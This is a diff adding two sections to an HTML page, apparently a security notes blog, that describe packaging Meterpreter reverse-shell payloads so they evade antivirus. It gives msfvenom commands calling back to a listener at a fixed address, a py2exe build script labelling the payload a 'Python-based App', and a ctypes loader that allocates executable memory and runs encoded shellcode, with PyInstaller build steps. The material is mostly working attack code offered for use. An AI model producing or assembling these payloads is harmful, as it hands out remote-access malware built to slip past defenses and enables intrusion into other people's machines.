@@ -256,6 +256,89 @@ print(&quot;Please check your webserver log or netcat to check result.&quot;)
 <li><a href="https://github.com/apache/myfaces/blob/master/impl/src/main/java/org/apache/myfaces/application/viewstate/StateUtils.java#L237">https://github.com/apache/myfaces/blob/master/impl/src/main/java/org/apache/myfaces/application/viewstate/StateUtils.java#L237</a></li>
 </ul>
 
+<h1 id="about-meterpreter-antivirus-bypass-py2exe">About Meterpreter Antivirus Bypass - Py2exe</h1>
+
+<ul>
+<li>Generate Payload: <code>msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.20.131 LPORT=4444 -f raw -o /tmp/mrtp.py</code></li>
+<li>Install Python 2.7 with x86 version of Py2exe (MUST BE x86, even you are x86_64)</li>
+</ul>
+
+<p>Write <code>setup.py</code> for building:</p>
+
+<pre><code class="language-python">#!/usr/bin/env python2
+#-*- encoding:utf-8 -*-
+
+from distutils.core import setup
+import py2exe
+
+setup(
+name = &quot;Meter&quot;,
+description = &quot;Python-based App&quot;,
+version = &quot;1.0&quot;,
+console = [&quot;mrtp.py&quot;],
+options = {&quot;py2exe&quot;:{&quot;bundle_files&quot;:1,&quot;packages&quot;:&quot;ctypes&quot;,&quot;includes&quot;:&quot;base64,sys,socket,struct,time,code,platform,getpass,shutil&quot;,}},
+zipfile = None
+)
+</code></pre>
+
+<p>Then run: <code>python ./setup.py py2exe</code>, it is able to bypass AV now.</p>
+
+<h1 id="about-meterpreter-antivirus-bypass-pyinstaller">About Meterpreter Antivirus Bypass - PyInstaller</h1>
+
+<ul>
+<li>Generate shell code: <code>msfvenom -p windows/meterpreter/reverse_tcp LPORT=4444 LHOST=192.168.20.131  -e x86/shikata_ga_nai -i 11 -f py -o  /tmp/mytest.py</code></li>
+</ul>
+
+<p>Build your payload:</p>
+
+<pre><code class="language-python">#!/usr/bin/env python2
+#-*- encoding:utf-8 -*-
+
+import ctypes
+
+def execute():
+    # Bind shell
+    shellcode = bytearray(
+    &quot;\xbe\x24\x6e\x0c\x71\xda\xc8\xd9\x74\x24\xf4\x5b\x29&quot;
+    &quot;\xc9\xb1\x99\x31\x73\x15\x03\x73\x15\x83\xeb\xfc\xe2&quot;
+    &lt;HERE IS YOUR FULL SHELL CODE!&gt;
+    &quot;\xd1\xb4\xdb\xa8\x6d\x6d\x10\x17\x33\xf9\x2c\x93\x2b&quot;
+    &quot;\x0b\xcb\x94\x1a\xd9\xfd\xc7\x78\x26\xb3\x57\xea\x6d&quot;
+    &quot;\x37\xa5\x48\xea\x47\xf6\x81\x90\x07\xc6\x62\x9a\x56&quot;
+    &quot;\x13&quot;
+     )
+
+    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
+    ctypes.c_int(len(shellcode)),
+    ctypes.c_int(0x3000),
+    ctypes.c_int(0x40))
+
+    buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
+
+    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
+    buf,
+    ctypes.c_int(len(shellcode)))
+
+    ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
+    ctypes.c_int(0),
+    ctypes.c_int(ptr),
+    ctypes.c_int(0),
+    ctypes.c_int(0),
+    ctypes.pointer(ctypes.c_int(0)))
+
+    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),
+    ctypes.c_int(-1))
+if __name__ == &quot;__main__&quot;:
+    execute()
+</code></pre>
+
+<ul>
+<li>Install pywin32 and pyinstaller</li>
+<li>Run <code>pyinstaller.py -F --console myshellcode.py</code></li>
+</ul>
+
+<p>it is able to bypass AV now.</p>
+
       </article>
       <div id="disqus_thread"></div>
 <script type="application/javascript">
